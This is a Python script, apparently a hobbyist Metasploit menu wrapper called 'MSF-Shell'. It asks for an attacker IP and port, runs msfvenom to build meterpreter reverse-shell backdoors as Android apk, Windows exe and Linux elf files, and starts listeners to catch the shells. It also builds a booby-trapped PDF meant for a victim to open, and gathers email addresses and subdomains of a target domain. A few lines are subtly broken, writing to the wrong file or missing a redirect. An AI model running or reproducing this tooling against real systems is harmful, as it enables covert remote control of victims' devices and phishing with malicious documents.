import os
import time
from sys import stdout

# tool en ingles pa los gringos xd
#colores
from colors import red, green, blue, yellow, purple, white


# si solo copias y pegas dame creditos XDD

banner="""

+-----------------------|-----------------------|-----------------------+
|                                                                       |
|  #     #                      #####                                   |
|  ##   ##  ####  ######       #     # #    # ###### #      #           |
|  # # # # #      #            #       #    # #      #      #           |
|  #  #  #  ####  #####  #####  #####  ###### #####  #      #           |
|  #     #      # #                  # #    # #      #      #           |
|  #     # #    # #            #     # #    # #      #      #           |
|  #     #  ####  #             #####  #    # ###### ###### ######      |
|                                                                       |
+-----------------------|-----------------------|-----------------------+

"""
help="""
+-----------------------------------------------+
|      Commands                                 |
| Command          | Description                |  
| use              | Use a payload or auxiliary.|
| help             | Show available commands.   |
| exit             | Finish the script.         |
| show credits     | Show the credits.          |
| banner           | Show the banner.           |
| show payloads    | Show Payloads.             |
| show auxiliarys  | Show Auxiliarys.           |
| show exploits    | Show Exploits.             |
+-----------------------------------------------+

"""
creditos="""

+-----------------------+
|Tool hecho por GeerxOS |
|=======================|
|Telegram: t.me/geraaxd |
|=======================|
|Discord: Geerx#5380    |
|=======================|
|TikTok: whois_.gerx    |
|=======================|
|Instagram: whois_.gerx |
|=======================|
|YouTube: ...           |
+=======================+

"""

payloads="""

+----------------------------------+ 
|       Android Payloads           |
|                                  |
| android/meterpreter/reverse_tcp  |
|                                  |
| android/meterpreter/reverse_http |
|==================================|
|      Windows Payloads            |
| windows/meterpreter/reverse_tcp  |
|                                  |
| windows/meterpreter/reverse_http |
|==================================|
|      Linux Payloads              |
| linux/x86/meterpreter/reverse_tcp|
+==================================+

"""
auxiliarys="""

+====================================================+
|             Auxiliary Totals:                      |   
|               2 Auxiliarys                         |
| auxiliary/gather/search_email_collector            |
|                                                    |
| auxiliary/gather/searchengine_subdomains_collector |
+====================================================+

"""

exploits="""

+=======================================================+
|                   Exploits Totals:                    |
|                     1 Exploit                         |
| exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs|
|                                                       |
+=======================================================+
"""
# se inicia la db de metasploit para mas rapidez :)

os.system("service postgresql start")
time.sleep(2)

user = input("Give me your username:")
print("Ok")

os.system("clear")
green()
print(banner)

def main():
    green()
    print("Use the help command to see the options!")
    red()
    opcion = input("root@"+user+":~# ")

    if opcion =="help":
        os.system("clear")
        blue()
        print(banner)
        print(help)
        main()

    if opcion =="show auxiliarys":
        os.system("clear")
        blue()
        print(banner)
        print(auxiliarys)
        main()

    if opcion =="show payloads":
        os.system("clear")
        blue()
        print(banner)
        print(payloads)
        main()

    if opcion=="show exploits":
        os.system("clear")
        blue()
        print(banner)
        print(exploits)
        main()

    if opcion =="banner":
        os.system("clear")
        blue()
        print(banner)
        main()

    if opcion =="show credits":
        os.system("clear")
        blue()
        print(banner)
        print(creditos)
        main()

    if opcion =="exit":
        os.system("rm android_tcp.rb android_http.rb windows_tcp.rb windows_http.rb linux_tcp.rb gmails.rb sdomains.rb adobejs_listener.rb adobe_pdfjs.rb")
        print("Good Bye!")
        exit()

    if opcion =="use":
        os.system("clear")
        blue()
        print(banner)
        red()
        print("")
        print("[X] Error. Please use auxiliary or payload! :)")
        print("")
        print("Example: use android/meterpreter/reverse_tcp")
        print("")
        main()
    
    if opcion =="show":
        os.system("clear")
        red()
        print(banner)
        print("")
        print("[X] Error. Please use show payloads/auxiliarys/credits! :)")
        print("")
        main()

    if opcion =="use android/meterpreter/reverse_tcp":
        android_tcp()

    if opcion =="use android/meterpreter/reverse_http":
        android_http()

    if opcion =="use windows/meterpreter/reverse_tcp":
        windows_tcp()

    if opcion =="use windows/meterpreter/reverse_http":
        windows_http()

    if opcion =="use linux/x86/meterpreter/reverse_tcp":
        linux_tcp()

    if opcion =="use auxiliary/gather/search_email_collector":
        search_email()

    if opcion =="use auxiliary/gather/searchengine_subdomains_collector":
        search_sdomains()
    
    if opcion=="use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
        adobe_exe()

def android_tcp():
    os.system("clear")
    print(banner)
    red()
    print("Using: android/meterpreter/reverse_tcp")
    print("")
    ip = input("Attacker IP: ")
    print("")
    port = input("Listen Port: ")
    print("")
    name = input("Name for the apk: ")
    print("")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: android/meterpreter/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" > "+name+".apk")
    print("Payload created! [01]")
    print("Saved in: "+name+".apk")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> android_tcp.rb")
    os.system("echo 'set payload android/meterpreter/reverse_tcp' >> android_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> android_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> android_tcp.rb")
    os.system("echo 'exploit' >> android_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r android_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def android_http():
    os.system("clear")
    print(banner)
    red()
    print("Using: android/meterpreter/reverse_http")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the apk: ")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: android/meterpreter/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p android/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" > "+name+".apk")
    print("Payload created! [01]")
    print("Saved in: "+name+".apk")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> android_http.rb")
    os.system("echo 'set payload android/meterpreter/reverse_http' >> android_http.rb")
    os.system("echo 'set LHOST "+ip+"' >> android_http.rb")
    os.system("echo 'set LPORT "+port+"' >> android_http.rb")
    os.system("echo 'exploit' >> android_http.rb")
    os.system("gnome-terminal -- msfconsole -r android_http.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def windows_tcp():
    os.system("clear")
    print(banner)
    red()
    print("Using: windows/meterpreter/reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the exe: ")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: windows/meterpreter/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe")
    print("Payload created! [01]")
    print("Saved in "+name+".exe")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> windows_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> windows_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> windows_tcp.rb")
    os.system("echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> windows_tcp.rb")
    os.system("echo 'exploit' >> windows_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r windows_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()


def windows_http():
    os.system("clear")
    print(banner)
    red()
    print("Using: windows/meterpreter/reverse_http")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the exe: ")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: windows/meterpreter/reverse_http")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p windows/meterpreter/reverse_http LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe")
    print("Payload created! [01]")
    print("Saved in "+name+".exe")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> windows_http.rb")
    os.system("echo 'set LHOST "+ip+"' >> windows_http.rb")
    os.system("echo 'set LPORT "+port+"' >> windows_tcp.rb")
    os.system("echo 'set PAYLOAD windows/meterpreter/reverse_http' >> windows_http.rb")
    os.system("echo 'exploit' >> windows_http.rb")
    os.system("gnome-terminal -- msfconsole -r windows_http.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def linux_tcp():
    os.system("clear")
    print(banner)
    red()
    print("Using: linux/x86/meterpreter/reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the elf: ")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: linux/x86/meterpreter/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf")
    print("Payload created! [01]")
    print("Payload saved in: "+name+".elf")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> linux_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> linux_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> linux_tcp.rb")
    os.system("echo 'set PAYLOAD linux/x86/meterpreter/reverse_tcp' >> linux_tcp.rb")
    os.system("echo 'run' >> linux_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r linux_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def search_email():
    os.system("clear")
    print(banner)
    red()
    print("Using: auxiliary/gather/search_email_collector")
    domain = input("Give me the domain: ")
    output = input("Output file: ")
    print("Ok!")
    green()
    print("+--------------------------------------------+ ")
    print("+-> Auxiliary data")
    print("+-> Auxiliary: auxiliary/gather/search_email_collector")
    print("+-> Domain: "+domain+" ")
    print("+-> Output: "+output+" ")
    print("+--------------------------------------------+ ")
    os.system("echo 'use auxiliary/gather/search_email_collector' >> emails.rb")
    os.system("echo 'set DOMAIN "+domain+"' >> emails.rb")
    os.system("echo 'set OUTFILE "+output+"' >> emails.rb")
    os.system("echo 'exploit' >> emails.rb")
    print("Running metasploit-framework...")
    os.system("gnome-terminal -- msfconsole -r emails.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def search_sdomains():
    os.system("clear")
    print(banner)
    red()
    print("Using: auxiliary/gather/searchengine_subdomains_collector")
    domain = input("Give me the domain: ")
    print("Ok!")
    green()
    print("+------------------------------------------------------------------+ ")
    print("+-> Auxiliary data")
    print("+-> Auxiliary: auxiliary/gather/searchengine_subdomains_collector")
    print("+-> Target: "+domain+"")
    print("+------------------------------------------------------------------+ ")
    os.system("echo 'use auxiliary/gather/searchengine_subdomains_collector' >> sdomains.rb")
    os.system("echo 'set TARGET "+domain+"' >> sdomains.rb")
    os.system("echo 'exploit' >> sdomains.rb")
    print("Running metasploit-framework...")
    os.system("gnome-terminal -- msfconsole -r sdomains.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()

def adobe_exe():
    os.system("clear")
    print(banner)
    red()
    print("Using: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
    filename = input("File name: ")
    lhost = input("Attacker IP: ")
    lport = input("Listen port: ")
    print("Ok!")
    green()
    print("+------------------------------------------------------------------+ ")
    print("+-> Exploit data")
    print("+-> Auxiliary: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
    print("+-> Filename: "+filename+"")
    print("+-> Attacker IP: "+lhost+"")
    print("+-> Listen Port: "+lport+"")
    print("+------------------------------------------------------------------+ ")
    print("Running metasploit...")
    # se crea el .rb del pdf
    os.system("echo 'use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs' >> adobe_pdfjs.rb")
    os.system("echo 'set filename "+filename+".pdf' >> adobe_pdfjs.rb")
    os.system("echo 'set lhost "+lhost+"' adobe_pdfjs.rb")
    os.system("echo 'set lport "+lport+"' >> adobe_pdfjs.rb")
    os.system("echo 'exploit' >> adobe_pdfjs.rb")
    # ahora se crea el listener para esperar a que la victima abra el pdf backdoor
    os.system("echo 'use exploit/multi/handler' >> adobejs_listener.rb")
    os.system("echo 'set payload windows/meterpreter/reverse_tcp' >> adobejs_listener.rb")
    os.system("echo 'set lhost "+lhost+"' >> adobejs_listener.rb")
    os.system("echo 'set lport "+lport+"' >> adobejs_listener.rb")
    os.system("echo 'exploit' >> adobejs_listener.rb")
    # ahora se lanzan las terminales de metasploit
    # lanza la terminal de crear pdf
    os.system("gnome-terminal -- msfconsole -r adobe_pdfjs.rb &")
    # lanza la terminal del listener
    os.system("gnome-terminal -- msfconsole -r adobejs_listener.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")
    print(banner)
    main()


main()

# si copias y pegas tan siquiera da creditos pls me costo hacer esto
